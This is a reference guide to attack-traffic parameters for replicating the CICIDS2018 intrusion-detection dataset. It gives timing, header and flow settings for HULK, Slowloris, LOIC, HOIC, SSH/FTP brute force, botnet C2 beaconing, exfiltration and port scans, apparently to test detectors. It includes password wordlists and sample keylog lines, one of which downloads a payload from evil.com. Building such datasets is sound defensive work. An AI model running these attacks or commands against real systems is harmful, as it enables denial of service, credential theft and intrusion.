# CICIDS2018 Attack Parameters - Quick Reference Guide

## DoS Attack Parameters

### HULK Attack
```
TCP Settings:
  - SO_RCVBUF: 8192 bytes
  - TCP_NODELAY: Enabled (1)
  - Socket timeout: 5 seconds

Request Pattern:
  - Connection model: NEW connection per request
  - Request distribution: Weighted [70% 1-req, 15% 2-req, 10% 3-req, 3% 4-req, 2% 5-req]
  - Methods: HTTP/1.1 GET only
  - Keep-alive: DISABLED (Connection: close)
  
URL Structure:
  - Path: /{random_string_5-15} + ?{param1=val1}&{param2=val2}&...
  - Query params: 1-8 random parameters

Headers:
  - User-Agent: 8 variations (Chrome, Firefox, Safari, IE, Edge, iPhone, Android, Googlebot)
  - Accept: 4 variations (html/xhtml mix, json, image/webp, etc.)
  - Accept-Encoding: 4 variations (gzip/deflate, br, identity, etc.)
  - Referer: 8 URLs (Google, Bing, DuckDuckGo, Yahoo, Reddit, Wikipedia, StackOverflow, GitHub)
  - Accept-Language: en-US,en;q=0.{5-9}
  - Cache-Control: no-cache

Timing:
  - Delay between new requests: 2.0-3.0 seconds (THROTTLED)
  - Delay within multi-request connections: 0.01-0.1 seconds
  - Read timeout on response: 0.3 seconds

Flow Characteristics:
  - Tot Fwd Pkts: 2-3
  - Fwd Seg Size Min: 32 bytes
  - Init Fwd Win Byts: 8192
  - Flow Duration: < 100ms typically
  - Destination Ports: [80, 8080, 8888, 3000, 5000, 443]
```

### Slowloris Attack
```
TCP Settings:
  - SO_RCVBUF: 8192 bytes
  - Socket timeout: 10 seconds

Connection Model:
  - Initial connections: min(150, max(50, duration_seconds))
  - Typical: 50-150 open sockets maintained

Request Pattern:
  - HTTP method: GET (incomplete)
  - Last header set: NEVER includes final \r\n\r\n (CRITICAL)
  - Initial partial headers: GET, Host, User-Agent, Accept-Language, Referer
  - Keep-alive payload: X-a-{random_4}: {random_8}\r\n

Timing:
  - Initial connection phase: Sequential
  - Keep-alive interval: 10-15 seconds (SLOW)
  - Delay between reconnect attempts: Multiple per interval
  - Total duration defines attack length

Flow Characteristics:
  - Tot Fwd Pkts: 5-20 (low packet count)
  - Flow Duration: 60-300 seconds (VERY LONG)
  - Fwd IAT Mean: Very high (10-15 seconds)
  - Fwd IAT Max: Very high
  - Idle Mean/Min: High (connection waiting)
  - Destination Port: 80
```

### GoldenEye Attack
```
TCP Settings:
  - SO_RCVBUF: 8192 bytes
  - TCP_NODELAY: Enabled
  - Socket timeout: 5 seconds

Connection Model:
  - NEW connection per request (like HULK)
  - Random port selection per connection

Request Mix:
  - GET requests: 60% probability
    - URL: /{random_4-12}?param1=val1&...&paramN=valN (2-10 params)
    - Cache-Control: no-store, no-cache
    - Pragma: no-cache
  - POST requests: 40% probability
    - Body size: 50-400 bytes (random)
    - Content-Type: application/x-www-form-urlencoded
    - Content-Length: Correctly set

Headers:
  - User-Agent: 8 variations
  - Accept: 4 variations
  - Referer: 8 variations
  - Accept-Encoding: 4 variations
  - Accept-Language: en-US,en;q=0.{5-9}

Timing:
  - Delay between connections: 2.0-3.0 seconds (THROTTLED)
  - Response read timeout: 0.3 seconds

Flow Characteristics:
  - Tot Fwd Pkts: 3-4
  - TotLen Fwd Pkts: 359.6 bytes (mean)
  - Fwd Seg Size Min: 32 bytes
  - Init Fwd Win Byts: 8192
  - Flow Duration: 6-11 seconds (mean)
  - Destination Ports: [80, 8080, 8888, 3000, 5000, 443]
```

### SlowHTTPTest Attack
```
TCP Settings:
  - SO_RCVBUF: 8192 bytes
  - Socket timeout: 10 seconds

Connection Model:
  - Keep-alive connections: Target 50 open sockets
  - Connection reuse: Multiple POST bodies per connection (rare)

Request Pattern:
  - HTTP method: POST (slow body transmission)
  - Content-Length: 100,000-500,000 bytes (announced but not all sent)
  - Connection: keep-alive
  - Path: /{random_8}

Body transmission:
  - Data drip rate: 1-10 random bytes per chunk
  - Chunk interval: 1-3 seconds
  - Pattern: Very slow transmission keeps connection alive

Timing:
  - Connection cycle: Open → maintain 50 sockets → keep-alive loop
  - Keep-alive loop interval: 1-3 seconds (drip interval)
  - Reconnect deficit: When socket count drops below 50

Flow Characteristics:
  - Tot Fwd Pkts: 20-50+
  - TotLen Fwd Pkts: High (due to large Content-Length)
  - Fwd IAT Mean: HIGH (1-3 seconds between chunks)
  - Fwd IAT Max: Very high
  - Flow Duration: 30-120 seconds (LONG)
  - Idle Mean: Moderate to high
  - Destination Port: 80
```

---

## DDoS Attack Parameters

### LOIC-HTTP Attack
```
TCP Settings:
  - SO_RCVBUF: 8192 bytes
  - TCP_NODELAY: Enabled
  - Socket timeout: 10 seconds

Attack Intensity:
  - Threads: 10 (reduced from 20 for realism)
  - Requests per keep-alive connection: 1-5 (REDUCED from 20-200)
  - Total connections/minute: High volume

Request Pattern:
  - HTTP method: GET only
  - URL format: /{random_6-12}?{random_4}={random_8}
  - Connection: keep-alive
  - Host: Target IP
  - Accept: */*

Response Handling:
  - Read timeout: 0.01 seconds (minimal)
  - Drain response: Quick recv() then continue

Timing:
  - No delay between requests (per-thread, multi-threaded)
  - Threads run concurrently for sustained flood

Flow Characteristics:
  - Tot Fwd Pkts: 50-100+ (very high)
  - Flow Pkts/s: Very high
  - TotLen Fwd Pkts: Very high
  - PSH flag count: Very high
  - Destination Ports: [80, 8080, 8888, 3000, 5000, 443]
```

### LOIC-UDP Attack
```
UDP Settings:
  - Protocol: UDP (connectionless)
  - Socket timeout: 1 second

Packet Pattern:
  - Payload size: 512, 1024, or 1400 bytes (random per packet)
  - Destination port: Varies (53, 123, 161, 514, 1900, 5353, 19132)
  - Source port: Random/SystemAssigned

Attack Pattern:
  - Burst model: Create socket, send 1 packet, close socket
  - Alternate model: Reuse socket for 2-3 packets then close

Timing:
  - Delay between bursts: 0.3-0.5 seconds (creates ~2-3 UDP flows/sec)
  - Burst size: 1-3 packets from same socket

Flow Characteristics:
  - Tot Fwd Pkts: Hundreds to thousands
  - Fwd IAT Mean: Very low (rapid fire)
  - TotLen Fwd Pkts: Extremely high
  - Protocol: 17 (UDP)
  - Destination Port: Varies per flow
  - Flow Duration: Variable
```

### HOIC Attack
```
TCP Settings:
  - SO_RCVBUF: 8192 bytes
  - TCP_NODELAY: Enabled
  - Socket timeout: 5 seconds

Attack Intensity:
  - Threads: 10 (distributed load)
  - NEW connection per 1-3 requests (not keep-alive like LOIC-HTTP)

Request Pattern:
  - HTTP method: POST only
  - Body size: 500-12,000 bytes (random for diversity)
  - Content-Type: application/x-www-form-urlencoded
  - Connection: close

URL Structure:
  - Path: /{random_5-12}
  - Query parameters: 1-4 params

Requests per Connection:
  - Distribution: 1-3 POST requests per connection (random)
  - Rationale: Matches training data (~2.5 pkts per flow)

Timing:
  - Minimal delay between new connections
  - 0.1s timeout on response read

Flow Characteristics:
  - Tot Fwd Pkts: ~2.5 (mean), ~2.5 (median)
  - TotLen Fwd Pkts: ~149.4 bytes (mean), ~36.5 (median)
  - Fwd Seg Size Min: 20 bytes (no TCP timestamps)
  - Init Fwd Win Byts: 49,136 bytes
  - Flow Duration: Very short (~17ms)
  - Destination Ports: [80, 8080, 8888, 3000, 5000, 443]
```

---

## Brute Force Attack Parameters

### SSH Brute Force (Patator)
```
Target: port 22 (SSH)

Username Wordlist (25+ accounts):
  root, admin, user, ubuntu, test, guest, administrator, oracle,
  postgres, mysql, ftp, www, backup, operator, nagios, deploy,
  pi, ec2-user, centos, vagrant, ansible, jenkins, git, svn,
  www-data, daemon

Password Wordlist (30+ passwords):
  password, 123456, admin, root, test, "",
  password123, 12345678, qwerty, letmein, welcome, monkey,
  dragon, master, login, abc123, 111111, passw0rd, trustno1,
  iloveyou, 1234567890, 123123, 000000, shadow, sunshine,
  654321, football, charlie, access, thunder

SSH Protocol:
  1. TCP connect (SYN → ACK)
  2. SSH version exchange: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
  3. SSH key exchange (KEXINIT)
  4. Authentication attempt (password auth method)
  5. Disconnect

Implementation:
  - Primary: Paramiko library (full Python SSH client)
  - Fallback: Raw socket SSH protocol exchange

TCP Settings:
  - SO_RCVBUF: 8192 bytes
  - Socket timeout: 5 seconds per attempt

Timing:
  - Delay between attempts: 50-300ms
  - Attempt rate: ~3-10 attempts/second total

Flow Characteristics:
  - Dst Port: 22 (always)
  - Tot Fwd Pkts: 10-30 (handshake + auth + disconnect)
  - Fwd Seg Size Min: 20-32 bytes
  - Flow Duration: 2-5 seconds per flow
  - Pattern: Rapid sequential flows to port 22
  - Init Fwd Win Byts: 8192
```

### FTP Brute Force (Patator)
```
Target: port 21 (FTP)

Username/Password Wordlist: Same as SSH (25+ users, 30+ passwords)

FTP Protocol Sequence:
  1. TCP connect (SYN → ACK)
  2. Read server banner (e.g., "220 Ready")
  3. Send: USER {username}\r\n
  4. Read response
  5. Send: PASS {password}\r\n
  6. Read response (typically "530 Login invalid")
  7. Send: QUIT\r\n
  8. Close connection

TCP Settings:
  - SO_RCVBUF: 8192 bytes
  - Socket timeout: 5 seconds per attempt

Timing:
  - Delay between attempts: 50-300ms
  - Attempt rate: ~2-5 attempts/second total

Flow Characteristics:
  - Dst Port: 21 (always)
  - Tot Fwd Pkts: 6-12
  - Fwd Seg Size Min: 20-32 bytes
  - Flow Duration: 1-3 seconds per flow
  - Pattern: Rapid sequential flows to port 21
  - Init Fwd Win Byts: 8192
```

---

## Botnet Attack Parameters

### C2 Beaconing
```
Beacon Target: port 80 or 8080 (random per session)

HTTP Request Format:
  GET /api/check?id={bot_id}&seq={sequence}&t={timestamp} HTTP/1.1
  Host: target
  User-Agent: [Ares/Zeus-style agent]
  Cookie: session={bot_id}
  Accept: application/json
  Connection: close

Bot ID:
  - Format: 16 random alphanumeric characters
  - Unique per attack session
  - Consistent across all beacons in one session

Sequence Counter:
  - Starts at 0
  - Increments per beacon
  - Allows C2 to order message delivery

Request Timing:
  - Interval: 3-8 seconds between beacons (with jitter)
  - Connection model: NEW connection per beacon (Connection: close)

TCP Settings:
  - SO_RCVBUF: 8192 bytes
  - TCP_NODELAY: Enabled
  - Socket timeout: 10 seconds

Flow Characteristics:
  - Tot Fwd Pkts: ~2.56 (mean), ~2 (median)
  - TotLen Fwd Pkts: ~159.5 bytes (mean), ~0 (median edge)
  - Fwd Seg Size Min: 20 bytes
  - Init Fwd Win Byts: 2,053 bytes (DISTINCT from normal HTTP)
  - Dst Port: 8080 (primary)
  - Flow Duration: < 100ms (very short)
```

### Data Exfiltration
```
Exfil Target: port 80 or 8080 (random per upload)

Data Types Simulated:
  - Credentials: 1-8 KB payload
  - Keylogs: 256-2048 bytes
  - Clipboard: [payload size varies]
  - Screenshots: 4-32 KB
  - Browser History: 1-8 KB
  - Cookies: 1-8 KB
  - System Info: [varies]
  - Files: 4-32 KB

HTTP POST Format:
  POST /api/upload HTTP/1.1
  Host: target
  User-Agent: [Bot agent]
  Content-Type: application/json
  Content-Length: {body_length}
  Cookie: session={bot_id}
  Connection: close
  
  {"id":"{bot_id}","type":"{data_type}","data":"{base64_payload}","ts":{timestamp}}

Payload Encoding:
  - Original data → Base64 encoded
  - JSON-wrapped payload

Timing:
  - Interval: 2-6 seconds between exfil uploads (burst pattern)
  - Connection model: NEW connection per upload

TCP Settings:
  - SO_RCVBUF: 8192 bytes
  - TCP_NODELAY: Enabled
  - Socket timeout: 10 seconds

Flow Characteristics:
  - Tot Fwd Pkts: ~2 per flow
  - TotLen Fwd Pkts: Variable (based on payload size)
  - Fwd Seg Size Min: 20-32 bytes
  - Dst Port: 80 or 8080
  - Flow Duration: < 100ms (very short)
```

### Keylog & Command Polling
```
Polling Target: port 80 or 8080

Keylog Snippets (8 examples):
  "admin password123 enter"
  "https://bank.example.com tab username tab password enter"
  "ssh root@192.168.1.100 enter"
  "SELECT * FROM users WHERE id=1; enter"
  "net user administrator /active:yes enter"
  "type C:\\Users\\admin\\Documents\\passwords.txt enter"
  "curl http://evil.com/payload.exe -o C:\\temp\\update.exe enter"
  "powershell -enc JABjAGwAaQBlAG4AdA enter"

Keylog POST Format:
  POST /api/keylog HTTP/1.1
  Host: target
  User-Agent: [Bot agent]
  Content-Type: application/json
  Content-Length: {body_length}
  Connection: close
  
  {"id":"{bot_id}","keylog":"{keylog_data} [{timestamp}]"}

Command Polling GET Format:
  GET /api/cmd?id={bot_id}&status=idle HTTP/1.1
  Host: target
  Connection: close

Timing:
  - Interval: 1-4 seconds between polling cycles
  - POST (keylog) then GET (command status) per cycle

TCP Settings:
  - SO_RCVBUF: 8192 bytes
  - TCP_NODELAY: Enabled
  - Socket timeout: 10 seconds

Flow Characteristics:
  - Tot Fwd Pkts: ~2 per flow (POST/GET + close)
  - TotLen Fwd Pkts: Moderate
  - Fwd Seg Size Min: 20 bytes
  - Dst Port: 80 or 8080
  - Flow Duration: < 100ms (very short)
  - Pattern: Regular polling intervals (bot heartbeat)
```

---

## Infiltration (Reconnaissance) Attack Parameters

### TCP Connect Scan (-sT)
```
Scan Target: Variable destination ports (1-65535)

Port Priority:
  1. Common ports first: 21, 22, 23, 25, 53, 80, 110, 111, 119,
     135, 139, 143, 161, 389, 443, 445, 465, 514, 587, 636,
     993, 995, 1080, 1433, 1521, 1723, 2049, 2082, 2083,
     2086, 2087, 3128, 3306, 3389, 5432, 5900, 5901, 6379,
     8000, 8008, 8080, 8443, 8888, 9090, 9200, 9300, 27017
  2. Random high ports: 200 random ports from 1024-65535

Connection Sequence per Port:
  1. TCP SYN
  2. Wait for SYN-ACK (if open) or timeout
  3. Send ACK (if connected)
  4. Try to read data (socket.recv for open ports)
  5. Close connection (FIN/RST)

TCP Settings:
  - Socket timeout: 0.5 seconds per port
  - No SO_RCVBUF override (system default)

Timing:
  - Delay between port probes: 5-20ms (rapid but not floody)
  - Total scan time: Seconds to minutes depending on port count

Flow Characteristics:
  - Dst Port: VARIES (each probe different port)
  - Tot Fwd Pkts: 3-4 per flow
  - Flow Duration: 50-500ms (very short)
  - Pattern: Many sequential flows to same source, different dest ports
  - Init Fwd Win Byts: 8192 (varies by system)
```

### Service Banner Grabbing
```
Service-Specific Probes:
  FTP (21):         [empty - read banner]
  SSH (22):         [empty - read banner]
  Telnet (23):      [empty - read banner]
  SMTP (25):        EHLO scan.test\r\n
  DNS (53):         DNS version.bind query (binary: 18 bytes)
  HTTP (80):        GET / HTTP/1.0\r\nHost: target\r\n\r\n
  POP3 (110):       [empty - read banner]
  IMAP (143):       a001 CAPABILITY\r\n
  TLS (443):        TLS ClientHello start (binary: 11+ bytes)
  SMB (445):        SMB negotiate request (binary: 17+ bytes)
  MySQL (3306):     [empty - read banner]
  RDP (3389):       RDP connection initiation (13 bytes + mstshash)
  PostgreSQL (5432): SSLRequest packet (8 bytes)
  Redis (6379):     PING\r\n

Per-Port Process:
  1. TCP connect
  2. Read banner (if probe is empty)
  3. Send service-specific probe (if defined)
  4. Read response (up to 4KB)
  5. Send 1-3 additional probes (HELP, generic queries)
  6. Close connection

TCP Settings:
  - Socket timeout: 3 seconds per service
  - Read timeout: Varies (0.5 - 3 seconds for responses)

Timing:
  - Delay between service probes: 100-500ms
  - Total per service: 1-3 seconds

Flow Characteristics:
  - Tot Fwd Pkts: 4-10 per flow (probes + responses)
  - TotLen Fwd Pkts: Moderate (protocol-dependent)
  - Fwd Seg Size Min: 20-32 bytes
  - Flow Duration: 1-3 seconds
  - Bidirectional: Forward request + backward response
  - Dst Port: Fixed for each probe
```

### UDP Scan (-sU)
```
UDP Scan Ports:
  53 (DNS), 67 (DHCP), 68 (DHCP), 69 (TFTP),
  123 (NTP), 161 (SNMP), 162 (SNMP),
  445 (NetBIOS), 500 (IKE), 514 (Syslog),
  1900 (UPnP), 5060 (SIP), 5353 (mDNS)

Service-Specific Probes:
  DNS (53):     \xab\xcd\x01\x00\x00\x01... (DNS version.bind 53-byte query)
  NTP (123):    \xe3\x00\x04\xfa... (NTP version query 44 bytes + padding)
  SNMP (161/162): SNMP GET-REQUEST packet (38 bytes)
  IKE (500):    \x00...\x00 (28 zero bytes)
  SIP (5060):   OPTIONS sip:test@target SIP/2.0\r\nVia:... (full headers)
  mDNS (5353):  DNS query (same as DNS)

UDP Packet Properties:
  - Destination port: Service-specific
  - Payload: Protocol-appropriate probe
  - Source port: Random/system-assigned

Timing:
  - Delay between UDP probes: 50-200ms
  - Response timeout: 1 second per port
  - Rapid probing to multiple ports

Flow Characteristics:
  - Protocol: 17 (UDP)
  - Tot Fwd Pkts: 1-2 per flow
  - Dst Port: Varies
  - TotLen Fwd Pkts: Protocol-specific payload size (28-100+ bytes)
  - Flow Duration: Milliseconds (probe only, timeout)
```

### Aggressive Scan (Deep Fingerprinting)
```
Target Ports: Common TCP ports [21, 22, 25, 80, 443, 3306, 3389, 5432, 8080, etc.]

HTTP Port Probes (80, 8080, 8443, 8888, 443):
  GET / HTTP/1.1\r\nHost: target\r\n\r\n
  GET /robots.txt HTTP/1.1\r\nHost: target\r\n\r\n
  HEAD / HTTP/1.1\r\nHost: target\r\n\r\n
  OPTIONS / HTTP/1.1\r\nHost: target\r\n\r\n
  GET /sitemap.xml HTTP/1.1\r\nHost: target\r\n\r\n

SSH Port (22):
  Banner grab + version detection

SMTP Port (25):
  EHLO scan.test\r\n + MAIL FROM + multiple commands

Other Ports:
  Port-specific multi-probe sequences

Connection Model:
  - Use keep-alive for multiple requests per connection
  - Send all probes to same port in one session

TCP Settings:
  - Socket timeout: 3 seconds
  - Multiple probe cycles per service connection

Timing:
  - 3+ second timeout per connection
  - Multiple probe types per service

Flow Characteristics:
  - Tot Fwd Pkts: 10-20+ per flow (multiple requests)
  - TotLen Fwd Pkts: High (multiple HTTP requests + responses)
  - Fwd IAT Mean: Moderate (time between probes)
  - Flow Duration: 2-5 seconds
  - Bidirectional traffic (requests + responses)
  - Destination Port: Fixed per service
```

---

## Summary: Key Flow Parameters by Attack Type

| Attack | Protocol | Pkts/Flow | Bytes/Flow | Duration | Ports | Key Identifier |
|---|---|---|---|---|---|---|
| HULK | TCP | 2-3 | 172 mean | <1s | Variable | Rapid new connections |
| Slowloris | TCP | 5-20 | N/A | 60-300s | 80 | Long idle, slow timing |
| GoldenEye | TCP | 3-4 | 359 mean | 6-11s | Variable | Mixed GET/POST |
| SlowHTTPTest | TCP | 20-50 | High | 30-120s | 80 | Slow body transmission |
| LOIC-HTTP | TCP | 50-100+ | Very high | 10-60s | Variable | High volume streams |
| LOIC-UDP | UDP | 100-1000+ | Very high | 10-60s | Variable | Stateless flooding |
| HOIC | TCP | 2-3 | 149 mean | 10-60s | Variable | Large POST bodies |
| SSH Brute | TCP | 10-30 | N/A | 2-5s | 22 | Sequential auth failures |
| FTP Brute | TCP | 6-12 | N/A | 1-3s | 21 | Sequential USER/PASS |
| C2 Beacon | TCP | 2 | 159 mean | 3-8s | 80/8080 | Regular intervals |
| Exfiltration | TCP | 2 | Variable | 2-6s | 80/8080 | Large JSON payloads |
| Keylog+Cmd | TCP | 2 | Moderate | 1-4s | 80/8080 | Periodic polling |
| TCP Scan | TCP | 3-4 | N/A | <1s | 1-65535 | Port sweep pattern |
| Banner Grab | TCP | 4-10 | Moderate | 1-5s | 22/25/53/etc | Service signatures |
| UDP Scan | UDP | 1-2 | 28-100+ | ms | 53+ | Stateless probes |

---

## Implementation Notes

1. **DO NOT use Windows as attack source** - TCP timestamp options differ from Linux training data
2. **Maintain SO_RCVBUF=8192** for all TCP sockets where specified
3. **Use exact timing ranges** - Delays directly affect CICFlowMeter flow metrics
4. **Randomize all parameters** within specified ranges to avoid patterns
5. **Monitor socket cleanup** - Allow timeouts to naturally close connections
6. **Deploy CICFlowMeter identically** to original dataset generation
7. **Validate training data matches** before running replication attacks
